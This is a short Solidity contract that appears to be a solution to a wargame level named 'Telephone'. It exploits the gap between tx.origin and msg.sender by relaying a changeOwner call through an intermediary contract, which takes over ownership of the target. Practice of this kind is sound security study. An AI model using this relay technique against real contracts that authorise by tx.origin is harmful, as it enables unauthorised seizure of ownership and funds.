pragma solidity 0.8.7;

interface ITelephone {
    function changeOwner(address _owner) external;
}

/*
    There is difference between tx.origin and msg.sender
    
    tx.origin: is the original originator of transaction.
    msg.sender: is the recent sender of transaction.
 */
contract TelephoneConverter {
    ITelephone tp;

    constructor(ITelephone _addr) {
        tp = _addr;
    }

    function changeOwner(address _owner) public {
        tp.changeOwner(_owner);
    }
}
